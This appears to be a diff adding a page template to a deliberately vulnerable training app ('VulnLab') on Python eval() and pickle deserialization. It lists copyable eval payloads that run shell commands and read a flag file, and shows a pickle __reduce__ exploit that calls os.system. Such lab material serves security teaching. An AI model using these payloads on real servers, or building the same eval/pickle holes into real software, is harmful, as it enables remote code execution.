@@ -1,0 +1,149 @@
+{% extends "base.html" %}
+
+{% block title %}Insecure Deserialization & Eval - VulnLab{% endblock %}
+
+{% block content %}
+<div class="space-y-6">
+
+    <!-- Header -->
+    <div class="bg-cardbg border border-gray-800 rounded-xl p-6">
+        <div class="flex items-center gap-2">
+            <span class="text-xs font-mono uppercase bg-red-950 text-red-400 border border-red-800 px-2 py-0.5 rounded">OWASP #08</span>
+            <span class="text-xs font-mono uppercase bg-purple-950 text-purple-400 border border-purple-800 px-2 py-0.5 rounded">Remote Code Execution</span>
+        </div>
+        <h1 class="text-2xl font-bold text-white mt-2 flex items-center gap-2">
+            <span>📦</span> Insecure Deserialization &amp; Code Evaluation
+        </h1>
+        <p class="text-gray-400 text-sm mt-1 max-w-3xl">
+            Insecure deserialization occurs when untrusted data is used to instantiate objects or restore state. In Python, both direct <code class="text-cyan-300">eval()</code> and deserializing untrusted streams with <code class="text-red-400">pickle.loads()</code> lead straight to complete server takeover.
+        </p>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+
+        <!-- Challenge 1: Python eval() -->
+        <div class="bg-cardbg border border-gray-800 rounded-xl p-5 flex flex-col justify-between">
+            <div>
+                <div class="flex items-center justify-between mb-3">
+                    <h2 class="text-base font-bold text-cyan-400 flex items-center gap-2">
+                        <span>🧮</span> Challenge 1: Python eval() Evaluation
+                    </h2>
+                    <span class="text-xs font-mono bg-red-950 text-red-400 border border-red-800 px-2 py-0.5 rounded">Arbitrary Code</span>
+                </div>
+                <p class="text-xs text-gray-400 mb-4">
+                    The backend takes your mathematical or string formula and calls Python's native <code class="text-red-300">eval(expr)</code>.
+                </p>
+
+                <!-- Eval Form -->
+                <form action="{{ url_for('deserial') }}" method="POST" class="space-y-3">
+                    <input type="hidden" name="action" value="eval">
+                    <div>
+                        <label class="block text-xs font-mono text-gray-400 mb-1">Python Expression:</label>
+                        <input type="text" name="expression" class="w-full bg-terminal border border-gray-700 rounded p-2 text-xs text-cyan-300 font-mono focus:border-cyan-500 focus:outline-none" placeholder="e.g. __import__('os').popen('whoami').read()" required>
+                    </div>
+                    <button type="submit" class="w-full bg-cyan-900 hover:bg-cyan-800 text-cyan-100 border border-cyan-700 font-semibold text-xs py-2 rounded transition">
+                        Evaluate Expression &rarr;
+                    </button>
+                </form>
+
+                <!-- Cheat Sheet Payloads -->
+                <div class="mt-4 pt-3 border-t border-gray-800">
+                    <span class="text-[11px] font-mono text-gray-400 block mb-1">PAYLOADS (CLICK TO COPY):</span>
+                    <div class="flex flex-col gap-1.5">
+                        <span class="copy-payload payload-badge text-[11px] text-cyan-300 px-2 py-1 rounded break-all" data-payload="__import__('os').popen('whoami').read()">
+                            __import__('os').popen('whoami').read()
+                        </span>
+                        <span class="copy-payload payload-badge text-[11px] text-cyan-300 px-2 py-1 rounded break-all" data-payload="__import__('os').listdir('.')">
+                            __import__('os').listdir('.')
+                        </span>
+                        <span class="copy-payload payload-badge text-[11px] text-cyan-300 px-2 py-1 rounded break-all" data-payload="open('sample_files/super_secret_flag.txt').read()">
+                            open('sample_files/super_secret_flag.txt').read()
+                        </span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Eval Result Output -->
+            {% if eval_result is not none or eval_error %}
+            <div class="mt-4 p-3 bg-gray-950 rounded-lg border border-gray-800 font-mono text-xs">
+                <span class="text-gray-500 block mb-1">EVALUATION OUTPUT:</span>
+                {% if eval_result is not none %}
+                    <pre class="text-emerald-400 whitespace-pre-wrap">{{ eval_result }}</pre>
+                {% else %}
+                    <div class="text-red-400">❌ Error: {{ eval_error }}</div>
+                {% endif %}
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- Challenge 2: Insecure Pickle Deserialization -->
+        <div class="bg-cardbg border border-gray-800 rounded-xl p-5 flex flex-col justify-between">
+            <div>
+                <div class="flex items-center justify-between mb-3">
+                    <h2 class="text-base font-bold text-purple-400 flex items-center gap-2">
+                        <span>🥒</span> Challenge 2: Python Pickle Deserialization
+                    </h2>
+                    <span class="text-xs font-mono bg-purple-950 text-purple-400 border border-purple-800 px-2 py-0.5 rounded">pickle.loads()</span>
+                </div>
+                <p class="text-xs text-gray-400 mb-4">
+                    The backend accepts a Base64-encoded serialized Python object and unpickles it using <code class="text-red-300">pickle.loads(base64.b64decode(data))</code>.
+                </p>
+
+                <!-- Pickle Form -->
+                <form action="{{ url_for('deserial') }}" method="POST" class="space-y-3">
+                    <input type="hidden" name="action" value="pickle">
+                    <div>
+                        <label class="block text-xs font-mono text-gray-400 mb-1">Base64 Encoded Pickle Data:</label>
+                        <textarea name="pickle_data" rows="3" class="w-full bg-terminal border border-gray-700 rounded p-2 text-xs text-purple-300 font-mono focus:border-purple-500 focus:outline-none" placeholder="Paste Base64 pickle payload here..." required></textarea>
+                    </div>
+                    <button type="submit" class="w-full bg-purple-900 hover:bg-purple-800 text-purple-100 border border-purple-700 font-semibold text-xs py-2 rounded transition">
+                        Unpickle &amp; Execute Object &rarr;
+                    </button>
+                </form>
+
+                <!-- Sample Payload -->
+                <div class="mt-4 pt-3 border-t border-gray-800">
+                    <span class="text-[11px] font-mono text-gray-400 block mb-1">SAMPLE PRE-GENERATED PAYLOAD (DICT OBJECT):</span>
+                    <!-- Base64 of {'status': 'success', 'message': 'Hello from unpickler!'} -->
+                    <span class="copy-payload payload-badge text-[11px] text-purple-300 px-2 py-1 rounded break-all block" data-payload="gASVMQAAAAAAAAB9lCiMBnN0YXR1c5SMB3N1Y2Nlc3OUjAdtZXNzYWdlsowWSGVsbG8gZnJvbSB1bnBpY2tsZXIhlXUu">
+                        gASVMQAAAAAAAAB9lCiMBnN0YXR1c5SMB3N1Y2Nlc3OUjAdtZXNzYWdlsowWSGVsbG8gZnJvbSB1bnBpY2tsZXIhlXUu
+                    </span>
+                </div>
+            </div>
+
+            <!-- Pickle Result Output -->
+            {% if pickle_result or pickle_error %}
+            <div class="mt-4 p-3 bg-gray-950 rounded-lg border border-gray-800 font-mono text-xs">
+                <span class="text-gray-500 block mb-1">DESERIALIZED OBJECT:</span>
+                {% if pickle_result %}
+                    <pre class="text-emerald-400 whitespace-pre-wrap">{{ pickle_result }}</pre>
+                {% else %}
+                    <div class="text-red-400">❌ Pickle Error: {{ pickle_error }}</div>
+                {% endif %}
+            </div>
+            {% endif %}
+        </div>
+
+    </div>
+
+    <!-- Exploit Construction Guide -->
+    <div class="bg-cardbg border border-gray-800 rounded-xl p-6">
+        <h3 class="text-lg font-bold text-white mb-2 flex items-center gap-2">
+            <span>💡</span> How Python Pickle Exploits Work (__reduce__)
+        </h3>
+        <p class="text-xs text-gray-400 mb-3">
+            Python's <code class="text-cyan-300">pickle</code> module provides a special method <code class="text-yellow-300">__reduce__()</code> that can return a callable and arguments tuple. When unpickled, Python calls this function automatically (e.g. <code class="text-red-300">os.system('calc.exe')</code>)!
+        </p>
+        <pre><code class="language-python"># Example of how an attacker crafts a malicious pickle payload:
+import pickle, base64, os
+
+class RCEExploit:
+    def __reduce__(self):
+        return (os.system, ('calc.exe',))
+
+payload = base64.b64encode(pickle.dumps(RCEExploit())).decode()
+print("Malicious Base64 Payload:", payload)</code></pre>
+    </div>
+
+</div>
+{% endblock %}
